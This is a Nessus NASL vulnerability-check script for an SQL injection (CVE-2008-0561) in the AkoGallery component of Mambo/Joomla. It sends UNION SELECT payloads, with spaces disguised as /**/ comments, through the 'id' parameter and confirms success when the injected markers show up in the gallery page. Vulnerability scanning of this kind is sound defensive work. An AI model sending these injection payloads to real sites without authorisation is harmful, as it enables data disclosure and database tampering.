#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30151);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-0561");
  script_bugtraq_id(27557);
  script_xref(name:"OSVDB", value:"41214");

  script_name(english:"AkoGallery Component for Mambo / Joomla! index.php id Variable SQL Injection");
  script_summary(english:"Tries to manipulate gallery header");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AkoGallery, a third-party image gallery
plugin for Mambo / Joomla. 

The version of AkoGallery installed on the remote host fails to
sanitize user input to the 'id' parameter before using it in the
'GalleryHeader' function of the 'akogallery.php' script to construct a
database query.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated attacker may be able to exploit this issue to
manipulate database queries, leading to disclosure of sensitive
information, modification of data, or attacks against the underlying
database." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/5029" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


magic1 = unixtime();
magic2 = rand();

if (thorough_tests) exploits = make_list(
  string("-99999 UNION SELECT null,null,", magic1, crap(data:",null", length:17*5), ",", magic2, "--"),
  string("-99999 UNION SELECT null,null,", magic1, crap(data:",null", length:10*5), ",", magic2, "--")
);
else exploits = make_list(
  string("-99999 UNION SELECT null,null,", magic1, crap(data:",null", length:17*5), ",", magic2, "--")
);


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
foreach dir (dirs)
{
  # Try to exploit the issue to manipulate a category listing.
  foreach exploit (exploits)
  {
    r = http_send_recv3(method:"GET", port: port,
      item:string(
        dir, "/index.php?",
        "option=com_akogallery&",
        "Itemid=nessus&",
        "func=detail&",
        "id=", str_replace(find:" ", replace:"/**/", string:exploit)));
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we could manipulate the category / title 
    # in the gallery header.
    if (
      string("func=viewcategory&catid='>", magic2, "<") >< res &&
      string("/arrow.png' /> ", magic1, " <") >< res
    )
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
